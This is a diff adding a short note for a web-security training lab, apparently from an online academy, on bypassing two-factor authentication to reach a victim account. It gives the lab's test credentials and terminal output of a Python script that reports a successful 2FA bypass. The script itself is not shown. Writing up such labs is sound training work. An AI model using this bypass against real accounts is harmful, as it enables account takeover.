@@ -1,0 +1,13 @@
+Lab 02 - 2FA simple bypass
+
+End Goal: Bypass the 2FA verification and access Carlos' account.
+
+Your credentials: wiener:peter
+Victim's credentials carlos:montoya
+
+==============================================================================================================
+
+┌──(kali㉿kali)-[~/Downloads/Authentication-Vulnerabilities-Labs/lab-02]
+└─$ python3 authentication-lab-02.py "https://0a3000f5035f3428ab22b55d0075004c.web-security-academy.net"
+[+] Logging into Carlos' account and bypassing 2FA verification...
+[+] Successfully bypassed 2FA verification.
